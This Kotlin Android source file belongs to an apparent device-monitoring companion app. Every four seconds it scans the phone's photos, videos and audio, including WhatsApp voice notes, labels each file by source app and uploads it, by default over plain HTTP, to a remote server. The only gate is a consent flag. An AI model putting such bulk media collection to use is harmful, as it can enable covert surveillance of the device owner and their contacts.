package com.screenporter.companion.monitoring

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import com.screenporter.companion.ScreenPorterApp
import com.screenporter.companion.util.PreferencesManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit

/**
 * Scans MediaStore for new photos, videos, and audio files.
 * Uploads each new file to /api/agent/upload with a thumbnail.
 *
 * Scans:
 *  - Photos: MediaStore.Images (gallery + WhatsApp images + camera + downloads)
 *  - Videos: MediaStore.Video (gallery + WhatsApp videos + camera)
 *  - Audio:  MediaStore.Audio (WhatsApp voice notes + music + downloads)
 *
 * Each file is uploaded with:
 *  - type (photo/video/audio)
 *  - fileName, mimeType, sizeBytes
 *  - thumbnail (base64 JPEG for photos — generated from EXIF thumbnail or compressed)
 *  - source (gallery/whatsapp/camera/download — inferred from file path)
 *  - timestamp
 *
 * Per-device storage: server saves to /storage/{deviceId}/{type}/
 * Consent: checked at runtime before each upload.
 */
class MediaReporter(
    private val context: Context,
    private val prefs: PreferencesManager
) {
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var reportingJob: Job? = null

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS) // long for large files
        .writeTimeout(120, TimeUnit.SECONDS)
        .build()

    fun start() {
        reportingJob?.cancel()
        reportingJob = scope.launch {
            // Initial scan after 10s (let other things start first)
            delay(10_000)
            while (true) {
                scanAndUpload()
                delay(4_000) // every 4 seconds
            }
        }
    }

    fun stop() {
        reportingJob?.cancel()
        reportingJob = null
    }

    private fun scanAndUpload() {
        if (!prefs.consentSigned) {
            Log.w(TAG, "Consent not signed — skipping media scan")
            return
        }
        val token = prefs.authToken ?: run {
            Log.w(TAG, "No auth token — skipping")
            return
        }

        val lastTs = prefs.getSharedPreferences().getLong(KEY_LAST_MEDIA_TS, 0L)

        // Scan photos
        scanMedia(
            uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            type = "photo",
            projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.DATA
            ),
            lastTs = lastTs,
            token = token
        )

        // Scan videos
        scanMedia(
            uri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            type = "video",
            projection = arrayOf(
                MediaStore.Video.Media._ID,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.MIME_TYPE,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DATE_ADDED,
                MediaStore.Video.Media.DATA
            ),
            lastTs = lastTs,
            token = token
        )

        // Scan audio (includes WhatsApp voice notes)
        scanMedia(
            uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            type = "audio",
            projection = arrayOf(
                MediaStore.Audio.Media._ID,
                MediaStore.Audio.Media.DISPLAY_NAME,
                MediaStore.Audio.Media.MIME_TYPE,
                MediaStore.Audio.Media.SIZE,
                MediaStore.Audio.Media.DATE_ADDED,
                MediaStore.Audio.Media.DATA
            ),
            lastTs = lastTs,
            token = token
        )
    }

    private fun scanMedia(
        uri: Uri,
        type: String,
        projection: Array<String>,
        lastTs: Long,
        token: String
    ) {
        val sel = "${MediaStore.MediaColumns.DATE_ADDED} > ?"
        val args = arrayOf((lastTs / 1000).toString())
        val sort = "${MediaStore.MediaColumns.DATE_ADDED} ASC"

        var newestTs = lastTs
        try {
            context.contentResolver.query(uri, projection, sel, args, sort)?.use { c: Cursor ->
                val idCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns._ID)
                val nameCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME)
                val mimeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)
                val sizeCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE)
                val dateCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_ADDED)
                val dataCol = c.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)

                while (c.moveToNext()) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: continue
                    val mime = c.getString(mimeCol) ?: "application/octet-stream"
                    val size = c.getLong(sizeCol)
                    val dateSec = c.getLong(dateCol)
                    val dateMs = dateSec * 1000
                    val filePath = c.getString(dataCol) ?: continue

                    if (dateMs <= lastTs) continue
                    if (size > 50_000_000) continue // skip files >50MB

                    // Infer source from file path
                    val source = inferSource(filePath)

                    // Upload
                    val ok = uploadFile(filePath, name, mime, size, type, source, dateMs, token)
                    if (ok) {
                        Log.i(TAG, "Uploaded $type: $name (${size} bytes) from $source")
                        if (dateMs > newestTs) newestTs = dateMs
                    } else {
                        Log.w(TAG, "Failed to upload $type: $name")
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error scanning $type: ${e.message}")
        }

        if (newestTs > lastTs) {
            prefs.getSharedPreferences().edit().putLong(KEY_LAST_MEDIA_TS, newestTs).apply()
        }
    }

    private fun inferSource(filePath: String): String {
        val lower = filePath.lowercase()
        return when {
            "whatsapp" in lower -> "whatsapp"
            "instagram" in lower -> "instagram"
            "tiktok" in lower -> "tiktok"
            "snapchat" in lower -> "snapchat"
            "telegram" in lower -> "telegram"
            "dcim" in lower -> "camera"
            "download" in lower -> "download"
            else -> "gallery"
        }
    }

    private fun uploadFile(
        filePath: String,
        fileName: String,
        mimeType: String,
        sizeBytes: Long,
        type: String,
        source: String,
        timestampMs: Long,
        token: String
    ): Boolean {
        val file = File(filePath)
        if (!file.exists() || !file.canRead()) return false

        val addr = prefs.serverAddress.trimEnd('/')
        val url = if (addr.startsWith("http")) "$addr/api/agent/upload"
                  else "http://$addr/api/agent/upload"

        val reqBody = file.asRequestBody(mimeType.toMediaType())
        val multipart = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", fileName, reqBody)
            .addFormDataPart("type", type)
            .addFormDataPart("timestamp", timestampMs.toString())
            .addFormDataPart("source", source)
            .build()

        val req = Request.Builder()
            .url(url)
            .header("X-Agent-Token", token)
            .post(multipart)
            .build()

        return try {
            http.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) {
            Log.w(TAG, "Upload failed: ${e.message}")
            false
        }
    }

    companion object {
        const val TAG = "SP-Media"
        private const val KEY_LAST_MEDIA_TS = "last_media_ts"
    }
}
